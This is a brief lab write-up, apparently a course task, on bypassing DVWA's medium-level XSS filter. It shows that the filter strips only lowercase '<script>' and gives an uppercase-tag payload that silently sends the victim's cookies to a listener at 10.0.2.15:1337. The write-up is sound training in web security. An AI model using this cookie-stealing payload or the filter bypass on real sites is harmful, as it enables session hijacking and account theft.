Upon inspection of the DVWA MEDIUM source code, we see this key bit of information:


 echo '<pre>';
 echo 'Hello ' . str_replace('<script>', '', $_GET['name']);
 echo '</pre>'; 

 Since this only strips the exact match of '<script>' (all lowercase) we can bypass this by using mixed or full uppercase (eg. '<scRiPt>', '<SCRIPT>')


Therefore the payload below will work.

<SCRIPT>new Image().src = 'http://10.0.2.15:1337/csci369task2?cookie=' + document.cookie;</SCRIPT>



new Image().src is used to silently make the request, avoiding alert dialogs.
